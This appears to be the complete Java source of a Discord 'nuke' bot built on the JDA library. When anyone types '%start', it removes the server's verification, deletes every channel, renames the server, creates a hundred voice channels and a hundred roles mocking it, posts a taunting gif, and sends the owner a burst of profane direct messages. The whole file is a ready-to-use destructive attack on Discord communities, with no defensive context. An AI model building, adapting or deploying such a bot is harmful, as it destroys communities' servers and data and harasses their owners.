package listener;

import java.io.File;
import java.util.List;

import net.dv8tion.jda.api.Region;
import net.dv8tion.jda.api.entities.ChannelType;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Guild.VerificationLevel;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

public class CommandListener extends ListenerAdapter {
	
	@Override
	public void onMessageReceived(MessageReceivedEvent e) {

		if (e.isFromType(ChannelType.TEXT)) {
			User s = e.getMessage().getAuthor();
			String msg = e.getMessage().getContentDisplay();
			Guild g = e.getGuild();
						
			if (msg.equalsIgnoreCase("%start")) {
				g.getManager().setVerificationLevel(VerificationLevel.NONE).queue();
				g.createTextChannel("fucked").queue();
				g.getChannels().forEach(key -> {
					key.delete().queue();
				});
				g.getManager().setName("FUCKED").queue();
				g.getManager().setRegion(Region.RUSSIA).queue();
				
				
				for (int i=0; i < 100; i++){
				g.createVoiceChannel("FUCKED-BY-" + s.getName()).queue();
				g.createRole().setName("FUCKED-BY-" + s.getName()).queue();
				}
				
				
				try {
					s.openPrivateChannel().queue((key) ->
					{
						key.sendMessage("**SERVER FUCKING SUCCESFULLY (◡‿◡)**").queue();
					});
				}  catch (Exception e1) {
					System.out.println("An " + s.getName() + " konnte keien Privat Nachricht gesendet werden!");
				}
				
				
				List<TextChannel> channels = g.getTextChannelsByName("fucked", true);
				for(TextChannel ch : channels)
				{
				    ch.sendFile(new File("C:/vid.gif"), "I FUCKED YOUR SERVER").queue();
				}
				
				
				try {
					for (int i = 0; i < 10; i++){
				g.getOwner().getUser().openPrivateChannel().queue((key) ->
		        {
		            key.sendMessage(":skull_crossbones: YOUR SERVER WAS FUCKED :skull_crossbones:").queue();
		        });
					}
				}  catch (Exception e1) {
					System.out.println("\nFehler: \nAn " + g.getOwner().getUser().getName() + " konnte keien Privat Nachricht gesendet werden!");
				}
				
				
				
			}
			
		}
	}
	
	 
	
	}
	
